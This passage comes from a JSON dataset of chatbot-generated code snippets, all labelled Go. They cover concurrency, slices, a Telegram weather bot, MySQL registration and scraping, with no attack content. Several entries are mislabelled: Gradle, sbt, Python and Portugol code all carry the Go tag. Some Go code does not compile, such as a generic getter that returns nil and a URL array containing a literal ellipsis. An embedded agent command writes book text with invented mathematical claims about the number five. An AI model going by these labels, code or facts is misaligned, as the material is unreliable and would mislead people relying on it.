    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"sync\"\n)\n\ntype SafeSlice[T any] struct {\n\tdata  []T\n\tmutex sync.Mutex\n}\n\nfunc NewSafeSlice[T any]() *SafeSlice[T] {\n\treturn &SafeSlice[T]{\n\t\tdata: make([]T, 0),\n\t}\n}\n\nfunc (s *SafeSlice[T]) Append(item T) {\n\ts.mutex.Lock()\n\tdefer s.mutex.Unlock()\n\n\ts.data = append(s.data, item)\n}\n\nfunc (s *SafeSlice[T]) Get(index int) (T, bool) {\n\ts.mutex.Lock()\n\tdefer s.mutex.Unlock()\n\n\tif index >= 0 && index < len(s.data) {\n\t\treturn s.data[index], true\n\t}\n\n\treturn nil, false\n}\n\nfunc main() {\n\tslice := NewSafeSlice[int]()\n\n\tslice.Append(1)\n\tslice.Append(2)\n\tslice.Append(3)\n\n\tif value, ok := slice.Get(1); ok {\n\t\tfmt.Println(value) // Output: 2\n\t}\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_1.go"
  },
  {
    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx := context.Background() // Создаем корневой контекст\n\t\n\t// Можно использовать context.WithTimeout или context.WithCancel для создания контекста с таймаутом или отменой\n\t// Например:\n\t// ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)\n\t// defer cancel()\n\n\tgo myFunction(ctx) // Запускаем функцию в отдельной горутине\n\n\ttime.Sleep(10 * time.Second) // Даем время для выполнения функции\n\n\tfmt.Println(\"Завершение программы\")\n}\n\nfunc myFunction(ctx context.Context) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(\"Контекст завершился\")\n\t\t\treturn\n\t\tdefault:\n\t\t\t// Ваш код здесь, это место, где выполняется ваша функция в цикле\n\t\t\tfmt.Println(\"Выполняется...\")\n\t\t\ttime.Sleep(1 * time.Second) // Демонстрационная пауза\n\t\t}\n\t}\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_2.go"
  },
  {
    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tslice1 := []string{\"Hello\", \"world\"}\n\tslice2 := []string{\"How\", \"are\", \"you\"}\n\n\tslice3 := append(slice1, slice2...)\n\n\tfmt.Println(slice3) // [Hello world How are you]\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_7.go"
  },
  {
    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tslice1 := []string{\"Hello\", \"world\"}\n\tslice2 := []string{\"How\", \"are\", \"you\"}\n\n\tslice3 := append(slice1, slice2...)\n\n\tvar slice4 []string\n\tslice4 = append(slice4, slice1...)\n\tslice4 = append(slice4, slice2...)\n\n\tfmt.Println(slice3) // [Hello world How are you]\n\tfmt.Println(slice4) // [Hello world How are you]\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_8.go"
  },
  {
    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tslice1 := []int{1, 2, 3, 4, 5}\n\n\t// Создаем новый срез с той же емкостью, что и slice1\n\tslice2 := make([]int, len(slice1))\n\tcopy(slice2, slice1)\n\n\tfmt.Println(slice2) // [1 2 3 4 5]\n\n\t// Меняем значения в slice1\n\tslice1[0] = 10\n\tfmt.Println(slice1) // [10 2 3 4 5]\n\tfmt.Println(slice2) // [1 2 3 4 5]\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_9.go"
  },
  {
    "conversation_hash": "eb7605e9982716e7f8c13c5316c557dd",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tslice1 := []int{1, 2, 3, 4, 5}\n\n\tslice2 := slice1[:]\n\n\tfmt.Println(slice2) // [1 2 3 4 5]\n\n\t// Меняем значения в slice1\n\tslice1[0] = 10\n\tfmt.Println(slice1) // [10 2 3 4 5]\n\tfmt.Println(slice2) // [10 2 3 4 5]\n}",
    "filename": "eb7605e9982716e7f8c13c5316c557dd_10.go"
  },
  {
    "conversation_hash": "61f48eec9be82603666d883e1ba64c50",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc SafeWrite(nums [5]int, i, val int) [5]int {\n\tif i >= 0 && i < len(nums) {\n\t\tnums[i] = val\n\t}\n\treturn nums\n}\n\nfunc main() {\n\tnums := [5]int{1, 2, 3, 4, 5}\n\tfmt.Println(SafeWrite(nums, 2, 10)) // [1 2 10 4 5]\n\tfmt.Println(SafeWrite(nums, 10, 10)) // [1 2 10 4 5]\n}",
    "filename": "61f48eec9be82603666d883e1ba64c50_0.go"
  },
  {
    "conversation_hash": "a2fc2286cee72f56498a0b24347885da",
    "code_index": 5,
    "language": "Go",
    "libraries": [
      "mathematical",
      "the"
    ],
    "code": "{\n\t\"command\": {\n\t\t\"name\": \"append_to_file\",\n\t\t\"args\": {\n\t\t\t\"file\": \"book.docx\",\n\t\t\t\"text\": \"\\nGoing deeper into the abstract, five emerges as a figure of elegance in higher mathematics. Its presence in algebraic structures, multidimensional geometry, and complex equations is anything but arbitrary. In linear algebra, matrices and vectors often travel in quintuples, while in topology, five-fold symmetry reveals the quintessence of spatial relationships.\\n\\nBut the allure of five transcends the purview of pure mathematics and plays a pivotal role in applied areas as well. Statistics and probability theory leverage the central limit theorem, where distributions converge with a five-point summary. In cryptography, prime numbers like five secure modern communication, serving as silent sentinels guarding our digital exchanges. \\n\\nFrom the price of stocks to the orbits of planets, from the patterns of nature to the constructs of the human mind, the number five is a silent witness to order, symmetry, and beauty. It is a testament to the mathematical order underlying the seemingly chaotic universe.\\n\\nAs we transition from mathematical concepts to real-world applications, Chapter 1 will not only define five's position in abstract theories but also illustrate its tangible impact on everyday life and scientific advancement. It shapes the way we interact with the technology, informs economic models, and even guides precise scientific measurements.\\n\\nThe voyage through the mathematical landscape concludes with an appreciation of how profoundly the concept of five influences human thought and the natural world. This chapter aims to instill a sense of wonder about the ubiquitous yet often overlooked digit, which is so fundamental to our mathematical understanding of the cosmos.\\n\\n[To be continued...]\"\n\t\t}\n\t},\n\t\"thoughts\": {\n\t\t\"text\": \"I've appended new content to 'book.docx', expanding on the intricate role of the number five in both abstract and applied mathematics, highlighting its pervasiveness and depth of influence in various facets of the field.\",\n\t\t\"reasoning\": \"By elaborating on how the number five manifests in various branches of mathematics and emphasizing its practical applications, the content provides a holistic view, bridging the gap between theory and practicality.\",\n\t\t\"plan\": \"- Proceed to detailed sections within Chapter 1, examining specific mathematical phenomena where five is central\\n- Integrate examples that the general audience can relate to, grounding abstract concepts in real-world applications\\n- Maintain a word count check to ensure chapter length meets the objective\\n- Continue to append to 'book.docx' as segments of the chapter are completed\",\n\t\t\"criticism\": \"Care should be taken to balance technical detail with comprehensibility to ensure the content remains accessible. The writing should remain diverse, avoiding repetitiveness and ensuring each section contributes new and valuable insight into the number five.\",\n\t\t\"summaryforgpt\": \"Continued writing Chapter 1 of 'The Quintessential Five', adding content on five's influence in advanced mathematical areas and applications. The document 'book.docx' now contains further development of the initial chapter. No content beyond the additions has been added yet. The website visited earlier for research is Wikipedia, and the current file being written to is 'book.docx'. No shutdowns have occurred.\"\n\t}\n}",
    "filename": "a2fc2286cee72f56498a0b24347885da_5.go"
  },
  {
    "conversation_hash": "55e790b2702c052c448ae66b5fb6971e",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    maven {\n        url 'https://repo.luckperms.net/'\n    }\n}",
    "filename": "55e790b2702c052c448ae66b5fb6971e_4.go"
  },
  {
    "conversation_hash": "ce05a77618475c696fb07f1d03351888",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "JSON",
      "Wunderground",
      "struct",
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n\t\"github.com/kelseyhightower/envconfig\"\n)\n\ntype Config struct {\n\tWundergroundAPIKey    string `envconfig:\"WUNDERGROUND_API_KEY\"`\n\tWundergroundStationID string `envconfig:\"WUNDERGROUND_STATION_ID\"`\n\tTelegramBotToken      string `envconfig:\"TELEGRAM_BOT_TOKEN\"`\n\tTelegramChatID        int64  `envconfig:\"TELEGRAM_CHAT_ID\"`\n}\n\n// Define a struct to hold the weather data\ntype WeatherData struct {\n\tObservations []struct {\n\t\tMetric struct {\n\t\t\tTemp     float64 `json:\"temp\"`\n\t\t\tWindSpeed float64 `json:\"windSpeed\"`\n\t\t\tWindGust  float64 `json:\"windGust\"`\n\t\t\tHumidity int     `json:\"humidity\"`\n\t\t} `json:\"metric\"`\n\t} `json:\"observations\"`\n}\n\nfunc main() {\n\tvar config Config\n\terr := envconfig.Process(\"\", &config)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Create a new Telegram bot\n\tbot, err := tgbotapi.NewBotAPI(config.TelegramBotToken)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tbot.Debug = true\n\n\t// Set up the update configuration\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\t// Get updates from the bot\n\tupdates, err := bot.GetUpdatesChan(u)\n\n\t// Handle updates\n\tfor update := range updates {\n\t\tif update.CallbackQuery != nil {\n\t\t\t// Handle button click\n\t\t\thandleCallback(bot, update.CallbackQuery, config)\n\t\t} \t\n\t\tif update.Message != nil && update.Message.IsCommand() {\n\t\t\t// Handle commands\n\t\t\thandleCommand(bot, update.Message, config)\n\t\t}\n\t}\n}\n\nfunc handleCommand(bot *tgbotapi.BotAPI, message *tgbotapi.Message, config Config) {\n\tswitch message.Command() {\n\tcase \"weather\":\n\t\tsendWeatherData(bot, config, message.Chat.ID, true)\n\tdefault:\n\t\tmsg := tgbotapi.NewMessage(message.Chat.ID, \"Invalid command. Try /weather.\")\n\t\tbot.Send(msg)\n\t}\n}\n\nfunc sendWeatherData(bot *tgbotapi.BotAPI, config Config, chatID int64, updateLastMessage bool) {\n\t// Get weather data from Wunderground by station ID\n\twundergroundURL := fmt.Sprintf(\"https://api.weather.com/v2/pws/observations/current?stationId=%s&format=json&units=m&apiKey=%s\", config.WundergroundStationID, config.WundergroundAPIKey)\n\tresp, err := http.Get(wundergroundURL)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Parse weather data from JSON to struct\n\tvar weatherData WeatherData\n\terr = json.Unmarshal(body, &weatherData)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// Extract temperature, wind, and humidity data from struct\n\ttemp := weatherData.Observations[0].Metric.Temp\n\twindSpeed := weatherData.Observations[0].Metric.WindSpeed\n\twindGust := weatherData.Observations[0].Metric.WindGust\n\thumidity := weatherData.Observations[0].Metric.Humidity\n\n\t// Format weather data message\n\tmsgText := fmt.Sprintf(\"*Weather Data for %s*\\n\\nTemperature: %.1f°C\\nWind Speed: %.1f km/h\\nWind Gust: %.1f km/h\\nHumidity: %d%%\", config.WundergroundStationID, temp, windSpeed, windGust, humidity)\n\n\tif updateLastMessage {\n\t\t// Update last sent message with latest weather data\n\t\tmsg := tgbotapi.NewEditMessageText(chatID, int(lastMessageID), msgText)\n\t\tmsg.ParseMode = \"markdown\"\n\n\t\t// Create inline keyboard with a button\n\t\tkeyboard := tgbotapi.NewInlineKeyboardMarkup(\n\t\t\ttgbotapi.NewInlineKeyboardRow(\n\t\t\t\ttgbotapi.NewInlineKeyboardButtonData(\"Request Update\", \"update_request\"),\n\t\t\t),\n\t\t)\n\t\tmsg.ReplyMarkup = keyboard\n\n\t\tbot.Send(msg)\n\t} else {\n\t\t// Send new weather data as a message\n\t\tmsg := tgbotapi.NewMessage(chatID, msgText)\n\t\tmsg.ParseMode = \"markdown\"\n\n\t\t// Create inline keyboard with a button\n\t\tkeyboard := tgbotapi.NewInlineKeyboardMarkup(\n\t\t\ttgbotapi.NewInlineKeyboardRow(\n\t\t\t\ttgbotapi.NewInlineKeyboardButtonData(\"Request Update\", \"update_request\"),\n\t\t\t),\n\t\t)\n\t\tmsg.ReplyMarkup = keyboard\n\n\t\tsentMsg, err := bot.Send(msg)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\t// Store the ID of the sent message for updating later\n\t\tlastMessageID = sentMsg.MessageID\n\t}\n}\n\n// Define a variable to store the ID of the last sent message\nvar lastMessageID int\n\nfunc handleCallback(bot *tgbotapi.BotAPI, query *tgbotapi.CallbackQuery, config Config) {\n\tswitch query.Data {\n\tcase \"update_request\":\n\t\t// Handle the button click and perform any desired action\n\t\t// For example, you can update the last sent message with the latest weather data\n\t\tsendWeatherData(bot, config, query.Message.Chat.ID, true)\n\t}\n}",
    "filename": "ce05a77618475c696fb07f1d03351888_0.go"
  },
  {
    "conversation_hash": "ce05a77618475c696fb07f1d03351888",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/go-telegram-bot-api/telegram-bot-api\"\n\t\"github.com/kelseyhightower/envconfig\"\n)\n\ntype Config struct {\n\tWundergroundAPIKey    string `envconfig:\"WUNDERGROUND_API_KEY\"`\n\tWundergroundStationID string `envconfig:\"WUNDERGROUND_STATION_ID\"`\n\tTelegramBotToken      string `envconfig:\"TELEGRAM_BOT_TOKEN\"`\n\tTelegramChatID        int64  `envconfig:\"TELEGRAM_CHAT_ID\"`\n}\n\ntype WeatherData struct {\n\tObservations []struct {\n\t\tMetric struct {\n\t\t\tTemp     float64 `json:\"temp\"`\n\t\t\tWindSpeed float64 `json:\"windSpeed\"`\n\t\t\tWindGust  float64 `json:\"windGust\"`\n\t\t\tHumidity int     `json:\"humidity\"`\n\t\t} `json:\"metric\"`\n\t} `json:\"observations\"`\n}\n\nfunc main() {\n\tvar config Config\n\terr := envconfig.Process(\"\", &config)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tbot, err := tgbotapi.NewBotAPI(config.TelegramBotToken)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tbot.Debug = true\n\n\tu := tgbotapi.NewUpdate(0)\n\tu.Timeout = 60\n\n\tupdates, err := bot.GetUpdatesChan(u)\n\n\tfor update := range updates {\n\t\tif update.CallbackQuery != nil {\n\t\t\thandleCallback(bot, update.CallbackQuery, config)\n\t\t}\n\t\tif update.Message != nil && update.Message.IsCommand() {\n\t\t\thandleCommand(bot, update.Message, config)\n\t\t}\n\t}\n}\n\nfunc handleCommand(bot *tgbotapi.BotAPI, message *tgbotapi.Message, config Config) {\n\tswitch message.Command() {\n\tcase \"weather\":\n\t\tsendWeatherData(bot, config, message.Chat.ID, true)\n\tdefault:\n\t\tmsg := tgbotapi.NewMessage(message.Chat.ID, \"Invalid command. Try /weather.\")\n\t\tbot.Send(msg)\n\t}\n}\n\nfunc sendWeatherData(bot *tgbotapi.BotAPI, config Config, chatID int64, updateLastMessage bool) {\n\twundergroundURL := fmt.Sprintf(\"https://api.weather.com/v2/pws/observations/current?stationId=%s&format=json&units=m&apiKey=%s\", config.WundergroundStationID, config.WundergroundAPIKey)\n\tresp, err := http.Get(wundergroundURL)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer resp.Body.Close()\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tvar weatherData WeatherData\n\terr = json.Unmarshal(body, &weatherData)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\ttemp := weatherData.Observations[0].Metric.Temp\n\twindSpeed := weatherData.Observations[0].Metric.WindSpeed\n\twindGust := weatherData.Observations[0].Metric.WindGust\n\thumidity := weatherData.Observations[0].Metric.Humidity\n\n\tmsgText := fmt.Sprintf(\"*Weather Data for %s*\\n\\nTemperature: %.1f°C\\nWind Speed: %.1f km/h\\nWind Gust: %.1f km/h\\nHumidity: %d%%\", config.WundergroundStationID, temp, windSpeed, windGust, humidity)\n\n\tif updateLastMessage {\n\t\tmsg := tgbotapi.NewEditMessageText(chatID, int(lastMessageID), msgText)\n\t\tmsg.ParseMode = \"markdown\"\n\n\t\tkeyboard := tgbotapi.InlineKeyboardMarkup{\n\t\t\tInlineKeyboard: [][]tgbotapi.InlineKeyboardButton{\n\t\t\t\t{\n\t\t\t\t\ttgbotapi.NewInlineKeyboardButtonData(\"Request Update\", \"update_request\"),\n\t\t\t\t},\n\t\t\t},\n\t\t}\n\t\tmsg.ReplyMarkup = &keyboard\n\n\t\tbot.Send(msg)\n\t} else {\n\t\tmsg := tgbotapi.NewMessage(chatID, msgText)\n\t\tmsg.ParseMode = \"markdown\"\n\n\t\tkeyboard := tgbotapi.InlineKeyboardMarkup{\n\t\t\tInlineKeyboard: [][]tgbotapi.InlineKeyboardButton{\n\t\t\t\t{\n\t\t\t\t\ttgbotapi.NewInlineKeyboardButtonData(\"Request Update\", \"update_request\"),\n\t\t\t\t},\n\t\t\t},\n\t\t}\n\t\tmsg.ReplyMarkup = &keyboard\n\n\t\tsentMsg, err := bot.Send(msg)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\tlastMessageID = sentMsg.MessageID\n\t}\n}\n\nvar lastMessageID int\n\nfunc handleCallback(bot *tgbotapi.BotAPI, query *tgbotapi.CallbackQuery, config Config) {\n\tswitch query.Data {\n\tcase \"update_request\":\n\t\tsendWeatherData(bot, config, query.Message.Chat.ID, true)\n\t}\n}",
    "filename": "ce05a77618475c696fb07f1d03351888_1.go"
  },
  {
    "conversation_hash": "89ab74bad3ea2bb33d56f1731ade9525",
    "code_index": 8,
    "language": "Go",
    "libraries": [
      "org.gradle.caching.BuildCacheKey"
    ],
    "code": "plugins {\n    id 'java'\n    id 'groovy'\n    id 'maven'\n}\n\ngroup 'com.example.plugin'\nversion '1.0-SNAPSHOT'\n\nsourceCompatibility = 1.8\n\nrepositories {\n    mavenCentral()\n}\n\ndependencies {\n    implementation gradleApi()\n    implementation localGroovy()\n\n    implementation 'org.codehaus.groovy:groovy-all:3.0.7'\n    implementation 'com.spotify:docker-client:20.10.11'\n}\n\njar {\n    dependsOn tasks.createImageTask\n}\n\nimport org.gradle.caching.BuildCacheKey\n\ntask createImageTask(type: com.example.plugin.tasks.CreateDockerImageTask) {\n    // Configuration for the Docker task\n    imageName = providers.provider { 'my-docker-image' }\n    dockerfilePath = providers.provider { 'path/to/Dockerfile' }\n    srcDir = providers.provider { 'src/' }\n    envVariables = providers.provider { ['VAR1=value1', 'VAR2=value2'] } // Optional environment variables\n\n    // Include environment variables in the task's cache key\n    inputs.property('envVariables', envVariables)\n\n    doLast {\n        // Additional configuration when the task is executed\n        println \"Docker image created!\"\n    }\n}",
    "filename": "89ab74bad3ea2bb33d56f1731ade9525_8.go"
  },
  {
    "conversation_hash": "1266488bd1a4ff81fdc4493b293a350c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "lazy val root = (project in file(\".\"))\n  .settings(\n    name := \"GPTApp\",\n    scalaVersion := \"3.0.1\",\n    libraryDependencies += \"com.typesafe.akka\" %% \"akka-http\" % \"10.2.6\",\n    libraryDependencies += \"com.typesafe.akka\" %% \"akka-stream\" % \"2.6.16\",\n    libraryDependencies += \"com.google.cloud\" % \"google-cloud-translate\" % \"1.109.0\"\n  )",
    "filename": "1266488bd1a4ff81fdc4493b293a350c_0.go"
  },
  {
    "conversation_hash": "c335eafa3c74fb05545b628c1de6aecf",
    "code_index": 5,
    "language": "Go",
    "libraries": [
      "_root_.sbt.Keys.scalacOptions"
    ],
    "code": "import _root_.sbt.Keys.scalacOptions\n\nscalaVersion := \"3.1.0\"\n\nval scala3Options = Seq(\n  \"-source:3.1.0\",\n  \"-deprecation\",\n  \"-unchecked\",\n  \"-explain\",\n  \"-feature\",\n  \"-language:implicitConversions,higherKinds,givenWhen,ifLet,byNameImplicits,importedExtensionMethods,scala2Compat\"\n)\n\nscalacOptions ++= scala3Options\n\nlibraryDependencies ++= Seq(\n  \"ai.openai\" %% \"openai-scala\" % \"0.7.0\"\n)",
    "filename": "c335eafa3c74fb05545b628c1de6aecf_5.go"
  },
  {
    "conversation_hash": "5e6bbf36ed1dfb677fdf1e58d4a8685e",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "import (\n       \"github.com/jinzhu/gorm\"\n       _ \"github.com/go-sql-driver/mysql\"\n   )\n   \n   func main() {\n       db, err := gorm.Open(\"mysql\", \"user:password@/dbname?charset=utf8&parseTime=True&loc=Local\")\n       if err != nil {\n           log.Fatal(err)\n       }\n       defer db.Close()\n   \n       // Migrate database tables\n       db.AutoMigrate(&User{})\n   }",
    "filename": "5e6bbf36ed1dfb677fdf1e58d4a8685e_5.go"
  },
  {
    "conversation_hash": "5e6bbf36ed1dfb677fdf1e58d4a8685e",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func registerUser(c echo.Context) error {\n       // Parse and validate user registration form data\n       var user User\n       if err := c.Bind(&user); err != nil {\n           return err\n       }\n       if err := c.Validate(&user); err != nil {\n           return err\n       }\n\n       // Save user to the database\n       err := db.Create(&user).Error\n       if err != nil {\n           return err\n       }\n\n       // Return a success message to the client\n       return c.String(http.StatusOK, \"User registered successfully\")\n   }",
    "filename": "5e6bbf36ed1dfb677fdf1e58d4a8685e_6.go"
  },
  {
    "conversation_hash": "5e6bbf36ed1dfb677fdf1e58d4a8685e",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n       db, err := sql.Open(\"mysql\", \"user:password@/dbname?charset=utf8&parseTime=True&loc=Local\")\n       if err != nil {\n           log.Fatal(err)\n       }\n       defer db.Close()\n   }",
    "filename": "5e6bbf36ed1dfb677fdf1e58d4a8685e_8.go"
  },
  {
    "conversation_hash": "5e6bbf36ed1dfb677fdf1e58d4a8685e",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "type User struct {\n    Code                string\n    Name                string\n    Email               string\n    PreferredLanguage   string\n    UnsuccessfulLogins  int\n    LastLogin           time.Time\n}",
    "filename": "5e6bbf36ed1dfb677fdf1e58d4a8685e_9.go"
  },
  {
    "conversation_hash": "5e6bbf36ed1dfb677fdf1e58d4a8685e",
    "code_index": 10,
    "language": "Go",
    "libraries": [],
    "code": "func registerUser(c echo.Context) error {\n    // Parse and validate user registration form data\n    var user User\n    if err := c.Bind(&user); err != nil {\n        return err\n    }\n    if err := c.Validate(&user); err != nil {\n        return err\n    }\n\n    // Insert user data into the database\n    _, err := db.Exec(\"INSERT INTO users (code, name, email, preferred_language, unsuccessful_logins, last_login) VALUES (?, ?, ?, ?, ?, ?)\",\n        user.Code, user.Name, user.Email, user.PreferredLanguage, user.UnsuccessfulLogins, user.LastLogin)\n    if err != nil {\n        return err\n    }\n\n    // Return a success message to the client\n    return c.String(http.StatusOK, \"User registered successfully\")\n}",
    "filename": "5e6bbf36ed1dfb677fdf1e58d4a8685e_10.go"
  },
  {
    "conversation_hash": "5e6bbf36ed1dfb677fdf1e58d4a8685e",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"database/sql\"\n    _ \"github.com/go-sql-driver/mysql\"\n    \"time\"\n)\n\n// User represents a user in the system\ntype User struct {\n    Code                string\n    Name                string\n    Email               string\n    PreferredLanguage   string\n    UnsuccessfulLogins  int\n    LastLogin           time.Time\n}\n\n// UserRepository handles all database operations related to users\ntype UserRepository struct {\n    db *sql.DB\n}\n\n// NewUserRepository creates a new UserRepository instance\nfunc NewUserRepository(db *sql.DB) *UserRepository {\n    return &UserRepository{\n        db: db,\n    }\n}\n\n// RegisterUser inserts a new user into the database\nfunc (ur *UserRepository) RegisterUser(user User) error {\n    _, err := ur.db.Exec(\"INSERT INTO users (code, name, email, preferred_language, unsuccessful_logins, last_login) VALUES (?, ?, ?, ?, ?, ?)\",\n        user.Code, user.Name, user.Email, user.PreferredLanguage, user.UnsuccessfulLogins, user.LastLogin)\n    return err\n}",
    "filename": "5e6bbf36ed1dfb677fdf1e58d4a8685e_11.go"
  },
  {
    "conversation_hash": "b4bc4952158a1795ecf4635ba3173f84",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "# UI Setup continued, place this where you're setting up the rest of your UI components\nmodel_type_var = tk.StringVar(value='LSTM')  # Default value set to 'LSTM'\n\nlbl_model_type = tk.Label(root, text=\"Select Model Type:\")\nlbl_model_type.pack()\nradiobtn_lstm = tk.Radiobutton(root, text=\"LSTM\", variable=model_type_var, value='LSTM')\nradiobtn_lstm.pack()\nradiobtn_transformer = tk.Radiobutton(root, text=\"Transformer\", variable=model_type_var, value='Transformer')\nradiobtn_transformer.pack()",
    "filename": "b4bc4952158a1795ecf4635ba3173f84_11.go"
  },
  {
    "conversation_hash": "c0e7a8167d1958e597fda71e64e4484a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"sync\"\n)\n\ntype ScrapedData struct {\n    URL  string\n    Data string // represents scraped data\n}\n\nfunc scrapePage(url string, ch chan<- ScrapedData, wg *sync.WaitGroup) {\n    defer wg.Done()\n    // Simulate scraping of data\n    data := ScrapedData{URL: url, Data: \"some scraped data\"}\n    ch <- data\n}\n\nfunc processData(ch <-chan ScrapedData) {\n    for data := range ch {\n        fmt.Printf(\"Processing data from %s: %s\\n\", data.URL, data.Data)\n    }\n}\n\nfunc main() {\n    var wg sync.WaitGroup\n    ch := make(chan ScrapedData, 100)\n    urls := [100]string{\"https://example.com/page1\", ..., \"https://example.com/page100\"}\n\n    go processData(ch)\n\n    for _, url := range urls {\n        wg.Add(1)\n        go scrapePage(url, ch, &wg)\n    }\n\n    wg.Wait()\n    close(ch)\n}",
    "filename": "c0e7a8167d1958e597fda71e64e4484a_2.go"
  },
  {
    "conversation_hash": "c0e7a8167d1958e597fda71e64e4484a",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// simple_timing_test.go\npackage main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc heavyComputation() int {\n    result := 0\n    for i := 0; i < 1000000; i++ {\n        result += i\n    }\n    return result\n}\n\nfunc main() {\n    startTime := time.Now()\n    heavyComputation()\n    fmt.Printf(\"Go Execution Time: %v\\n\", time.Since(startTime))\n}",
    "filename": "c0e7a8167d1958e597fda71e64e4484a_4.go"
  },
  {
    "conversation_hash": "c0e7a8167d1958e597fda71e64e4484a",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"net/http\"\n    \"time\"\n)\n\nfunc main() {\n    client := &http.Client{\n        Timeout: time.Second * 10,\n    }\n\n    req, _ := http.NewRequest(\"GET\", \"https://example.com/page\", nil)\n    req.Header.Add(\"User-Agent\", \"Go Scraper Bot\")\n    resp, _ := client.Do(req)\n    // Process the response\n}",
    "filename": "c0e7a8167d1958e597fda71e64e4484a_6.go"
  },
  {
    "conversation_hash": "c0e7a8167d1958e597fda71e64e4484a",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "// Assume scrapePage is defined to perform an HTTP request to a URL\nurls := []string{ ... }\n\nresults := make(chan *Result)\nvar wg sync.WaitGroup\n\nfor _, url := range urls {\n    wg.Add(1)\n    go func(u string) {\n        defer wg.Done()\n        result, err := scrapePage(u)\n        if err == nil {\n            results <- result\n        }\n    }(url)\n}\n\ngo func() {\n    wg.Wait()\n    close(results)\n}()\n\nfor result := range results {\n    // Process the results as they come in\n}",
    "filename": "c0e7a8167d1958e597fda71e64e4484a_8.go"
  },
  {
    "conversation_hash": "5d333a7681ec69d944e7dc55ccafeb7f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "programa\n{\n    funcao inicio()\n    {\n        real nota1, nota2, nota3, nota4, nota5, media\n\n        leia(nota1)\n        leia(nota2)\n        leia(nota3)\n        leia(nota4)\n        leia(nota5)\n\n        media = (nota1 + nota2 + nota3 + nota4 + nota5) / 5\n\n        escreva(\"A média das notas é: \", media)\n    }\n}",
    "filename": "5d333a7681ec69d944e7dc55ccafeb7f_0.go"
  },
  {
    "conversation_hash": "5d333a7681ec69d944e7dc55ccafeb7f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
